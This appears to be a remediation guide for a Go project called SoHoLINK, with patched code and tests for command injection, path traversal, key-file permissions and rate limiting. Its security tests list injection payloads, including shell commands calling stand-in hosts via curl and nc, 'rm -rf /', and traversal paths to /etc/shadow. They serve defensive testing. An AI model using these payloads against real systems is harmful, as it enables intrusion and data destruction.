# Security Fixes Implementation Guide

**Priority:** 🔴 CRITICAL
**Time Required:** 17-24 hours
**Difficulty:** MEDIUM

---

## Quick Apply (Automated)

```bash
cd /path/to/soholink
./security-fixes/apply-all.sh
```

---

## Manual Application (Step-by-Step)

### Fix 1: Command Injection in AppArmor [2-3 hours] 🔴 CRITICAL

**Problem:** Shell command injection via profile names
**Impact:** Arbitrary command execution on host
**File:** `internal/compute/apparmor.go:422`

#### Apply Fix

```bash
# Apply patch
cd /path/to/SoHoLINK
git apply security-fixes/FIX_1_APPARMOR_INJECTION.patch

# OR manually edit internal/compute/apparmor.go
# Replace lines 414-425 with the secure version
```

#### Secure Code (Replace lines 414-425)

```go
// IsLoaded checks if the profile is currently loaded.
func (p *AppArmorProfile) IsLoaded() (bool, error) {
	// First check if AppArmor is enabled
	cmd := exec.Command("aa-status", "--enabled")
	if err := cmd.Run(); err != nil {
		return false, nil
	}

	// Get full status output WITHOUT shell
	cmd = exec.Command("aa-status")
	output, err := cmd.Output()
	if err != nil {
		return false, fmt.Errorf("failed to get aa-status output: %w", err)
	}

	// Search for profile name in output using Go strings (NOT grep!)
	return strings.Contains(string(output), p.Name), nil
}
```

#### Test Fix

```bash
# Run tests with malicious inputs
go test -v -run TestAppArmorInjection ./internal/compute/
```

**Create test file:** `internal/compute/apparmor_security_test.go`

```go
package compute

import (
	"strings"
	"testing"
)

func TestAppArmorInjection(t *testing.T) {
	maliciousNames := []string{
		"foo; rm -rf /",
		"bar && curl evil.com",
		"baz | nc attacker.com 1337",
		"$(whoami)",
		"`id`",
		"test'; DROP TABLE users; --",
	}

	for _, name := range maliciousNames {
		t.Run(name, func(t *testing.T) {
			profile := &AppArmorProfile{Name: name}

			// Should not panic or execute commands
			_, err := profile.IsLoaded()

			// May return false or error, but should NOT execute injected code
			// No assertion needed - if this doesn't panic or execute malicious code, it passes
			t.Logf("Tested malicious name: %s, err: %v", name, err)
		})
	}
}
```

---

### Fix 2: Path Traversal Protection [3-4 hours] 🔴 CRITICAL

**Problem:** No validation on file paths from user input
**Impact:** Arbitrary file read/write
**Files:** Multiple

#### Apply Fix

```bash
# Copy new validation package
cp security-fixes/FIX_2_PATH_VALIDATION.go internal/validation/paths.go

# Update existing code to use validation
```

#### Update `internal/did/keygen.go`

**Before (VULNERABLE):**
```go
func WriteKey(path string, data []byte) error {
	return os.WriteFile(path, data, 0600)
}
```

**After (SECURE):**
```go
import "github.com/NetworkTheoryAppliedResearchInstitute/soholink/internal/validation"

func WriteKey(basePath, filename string, data []byte) error {
	// Validate path to prevent traversal
	safePath, err := validation.ValidatePath(basePath, filename)
	if err != nil {
		return fmt.Errorf("invalid key path: %w", err)
	}

	return writeSecureFile(safePath, data)
}
```

#### Update Other Files

Files needing path validation:
- `internal/did/keygen.go` - Private key storage
- `internal/accounting/collector.go` - Log file paths
- `internal/compute/gpu.go` - Device file paths (READ ONLY - less critical)
- Any file upload/download handlers

**Pattern to apply:**

```go
// OLD PATTERN (UNSAFE):
filepath := userInput
os.WriteFile(filepath, data, 0644)

// NEW PATTERN (SAFE):
import "github.com/.../soholink/internal/validation"

safePath, err := validation.ValidatePath(baseDir, userInput)
if err != nil {
	return fmt.Errorf("invalid path: %w", err)
}
os.WriteFile(safePath, data, 0644)
```

#### Test Fix

```bash
# Run path traversal tests
go test -v -run TestPathTraversal ./internal/validation/
```

**Create test file:** `internal/validation/paths_test.go`

```go
package validation

import (
	"path/filepath"
	"testing"
)

func TestValidatePath_Traversal(t *testing.T) {
	base := "/var/lib/soholink"

	tests := []struct {
		name      string
		userPath  string
		shouldErr bool
	}{
		{"valid relative", "keys/alice.key", false},
		{"valid subdirectory", "users/bob/data", false},
		{"traversal parent", "../../../etc/shadow", true},
		{"traversal mixed", "foo/../../etc/passwd", true},
		{"absolute outside", "/etc/shadow", true},
		{"absolute inside", "/var/lib/soholink/keys/test", false},
		{"empty", "", true},
		{"dot dot", "..", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result, err := ValidatePath(base, tt.userPath)

			if tt.shouldErr && err == nil {
				t.Errorf("Expected error for path: %s, but got none (result: %s)", tt.userPath, result)
			}

			if !tt.shouldErr && err != nil {
				t.Errorf("Unexpected error for valid path %s: %v", tt.userPath, err)
			}

			if !tt.shouldErr && err == nil {
				// Valid paths should be within base
				if !filepath.HasPrefix(result, base) {
					t.Errorf("Valid path %s resulted in %s outside base %s", tt.userPath, result, base)
				}
			}
		})
	}
}
```

---

### Fix 3: Windows File Permissions [3-4 hours] 🟠 HIGH

**Problem:** Private keys readable by all users on Windows
**Impact:** Credential theft on Windows systems
**Files:** `internal/did/keygen.go`

#### Apply Fix

```bash
# Copy platform-specific implementations
cp security-fixes/FIX_3_WINDOWS_ACL.go internal/did/keygen_windows.go
cp security-fixes/FIX_3_UNIX_SECURE.go internal/did/keygen_unix.go
```

#### Update `internal/did/keygen.go`

**Remove direct os.WriteFile calls, use platform-specific functions:**

```go
// internal/did/keygen.go

// WritePrivateKey writes a private key with secure permissions.
func WritePrivateKey(basePath, filename string, key []byte) error {
	// Validate path first
	safePath, err := validation.ValidatePath(basePath, filename)
	if err != nil {
		return fmt.Errorf("invalid key path: %w", err)
	}

	// Use platform-specific secure write
	// This calls keygen_windows.go on Windows, keygen_unix.go on Unix
	return writeSecureFile(safePath, key)
}

// ReadPrivateKey reads a private key.
func ReadPrivateKey(basePath, filename string) ([]byte, error) {
	safePath, err := validation.ValidatePath(basePath, filename)
	if err != nil {
		return nil, fmt.Errorf("invalid key path: %w", err)
	}

	return readSecureFile(safePath)
}
```

#### Test Fix

**Windows Testing:**
```powershell
# Build on Windows
go build -o fedaaa.exe ./cmd/fedaaa

# Create test user
.\fedaaa.exe users add testuser

# Check ACL (should show only current user)
icacls "C:\ProgramData\SoHoLINK\keys\testuser.key"

# Expected output:
# C:\ProgramData\SoHoLINK\keys\testuser.key DOMAIN\YourUser:(F)
# Only one entry - current user with Full control
```

**Unix Testing:**
```bash
# Build on Linux/macOS
go build -o fedaaa ./cmd/fedaaa

# Create test user
./fedaaa users add testuser

# Check permissions
ls -l /var/lib/soholink/keys/testuser.key

# Expected output:
# -rw------- 1 youruser yourgroup 64 Feb 10 12:00 testuser.key
# Permissions: 600 (owner read/write only)
```

---

### Fix 4: Rate Limiting [2-3 hours] 🟠 HIGH

**Problem:** No protection against DoS attacks
**Impact:** Service unavailability
**Files:** `internal/radius/server.go`

#### Create Rate Limiter

**File:** `internal/radius/ratelimit.go`

```go
package radius

import (
	"sync"
	"time"

	"golang.org/x/time/rate"
)

// RateLimiter provides per-IP rate limiting.
type RateLimiter struct {
	mu       sync.Mutex
	limiters map[string]*rate.Limiter

	// Configuration
	requestsPerSecond float64
	burstSize         int
	cleanupInterval   time.Duration
}

// NewRateLimiter creates a new rate limiter.
// requestsPerSecond: sustained rate limit
// burstSize: maximum burst allowed
func NewRateLimiter(requestsPerSecond float64, burstSize int) *RateLimiter {
	rl := &RateLimiter{
		limiters:          make(map[string]*rate.Limiter),
		requestsPerSecond: requestsPerSecond,
		burstSize:         burstSize,
		cleanupInterval:   5 * time.Minute,
	}

	// Start cleanup goroutine
	go rl.cleanup()

	return rl
}

// Allow checks if a request from the given IP should be allowed.
func (rl *RateLimiter) Allow(ip string) bool {
	rl.mu.Lock()
	defer rl.mu.Unlock()

	limiter, exists := rl.limiters[ip]
	if !exists {
		limiter = rate.NewLimiter(rate.Limit(rl.requestsPerSecond), rl.burstSize)
		rl.limiters[ip] = limiter
	}

	return limiter.Allow()
}

// cleanup periodically removes old limiters to prevent memory leaks.
func (rl *RateLimiter) cleanup() {
	ticker := time.NewTicker(rl.cleanupInterval)
	defer ticker.Stop()

	for range ticker.C {
		rl.mu.Lock()
		// Simple approach: reset all limiters
		// In production, track last access time and remove only old ones
		rl.limiters = make(map[string]*rate.Limiter)
		rl.mu.Unlock()
	}
}

// GetStats returns current statistics.
func (rl *RateLimiter) GetStats() map[string]int {
	rl.mu.Lock()
	defer rl.mu.Unlock()

	return map[string]int{
		"tracked_ips": len(rl.limiters),
	}
}
```

#### Update RADIUS Server

**File:** `internal/radius/server.go`

```go
// Add rate limiter to Server struct
type Server struct {
	// ... existing fields ...

	rateLimiter *RateLimiter
}

// In NewServer():
func NewServer(config Config) *Server {
	return &Server{
		// ... existing initialization ...

		rateLimiter: NewRateLimiter(
			100.0, // 100 requests per second
			200,   // burst of 200
		),
	}
}

// In packet handler (before authentication):
func (s *Server) handlePacket(addr net.Addr, packet []byte) {
	// Extract IP address
	ip := extractIP(addr)

	// Check rate limit
	if !s.rateLimiter.Allow(ip) {
		// Log rate limit exceeded
		log.Printf("Rate limit exceeded for IP: %s", ip)
		// Drop packet (or send rejection)
		return
	}

	// Continue with normal authentication...
}

func extractIP(addr net.Addr) string {
	if udpAddr, ok := addr.(*net.UDPAddr); ok {
		return udpAddr.IP.String()
	}
	return addr.String()
}
```

#### Test Fix

```go
// internal/radius/ratelimit_test.go

package radius

import (
	"testing"
	"time"
)

func TestRateLimiter(t *testing.T) {
	rl := NewRateLimiter(10.0, 20) // 10 req/sec, burst 20

	ip := "192.168.1.100"

	// Burst should be allowed
	allowed := 0
	for i := 0; i < 25; i++ {
		if rl.Allow(ip) {
			allowed++
		}
	}

	// Should allow burst (20) but not more
	if allowed > 22 { // Allow some margin
		t.Errorf("Rate limiter allowed too many requests: %d", allowed)
	}

	// Wait and try again
	time.Sleep(1 * time.Second)

	// Should allow ~10 more
	allowed = 0
	for i := 0; i < 15; i++ {
		if rl.Allow(ip) {
			allowed++
		}
	}

	if allowed < 8 || allowed > 12 {
		t.Errorf("Rate limiter not working correctly after wait: %d allowed", allowed)
	}
}
```

---

## Verification Checklist

After applying all fixes:

### Automated Tests

```bash
# Run all tests
make test

# Run security-specific tests
go test -v -run TestSecurity ./...
go test -v -run TestInjection ./...
go test -v -run TestTraversal ./...

# Run security scanner
gosec -severity high ./...

# Run vulnerability check
govulncheck ./...
```

### Manual Verification

**Command Injection:**
- [ ] Tested with malicious profile names
- [ ] No shell commands executed
- [ ] Errors logged appropriately

**Path Traversal:**
- [ ] Tested with `../` sequences
- [ ] Tested with absolute paths
- [ ] All attempts blocked correctly

**Windows ACL:**
- [ ] Private keys only accessible to owner (Windows)
- [ ] icacls shows correct permissions
- [ ] Other users cannot read keys

**Rate Limiting:**
- [ ] Burst allowed up to limit
- [ ] Sustained rate enforced
- [ ] Statistics available

### Cross-Platform Testing

- [ ] Tested on Ubuntu 24.04
- [ ] Tested on Windows 11
- [ ] Tested on macOS Sonoma
- [ ] All tests pass on all platforms

---

## Rollback Plan

If issues occur after applying fixes:

```bash
# Revert all security changes
git checkout HEAD -- internal/compute/apparmor.go
git checkout HEAD -- internal/did/keygen.go
rm -rf internal/validation/
rm internal/did/keygen_windows.go
rm internal/did/keygen_unix.go
rm internal/radius/ratelimit.go

# Rebuild
make clean
make build-cli
```

---

## Timeline

| Fix | Time | Cumulative |
|-----|------|------------|
| Command Injection | 2-3h | 2-3h |
| Path Traversal | 3-4h | 5-7h |
| Windows ACL | 3-4h | 8-11h |
| Rate Limiting | 2-3h | 10-14h |
| Testing | 4-6h | 14-20h |
| Documentation | 2-3h | 16-23h |
| **Total** | **16-23h** | |

---

## Next Steps After Fixes

1. **Code Review** - Have another developer review changes
2. **Extended Testing** - Run in test environment for 24-48 hours
3. **Performance Testing** - Ensure rate limiting doesn't hurt performance
4. **Documentation** - Update SECURITY.md
5. **Release** - Create security patch release (v1.0.1)

---

**Status:** Ready for implementation
**Last Updated:** 2026-02-10
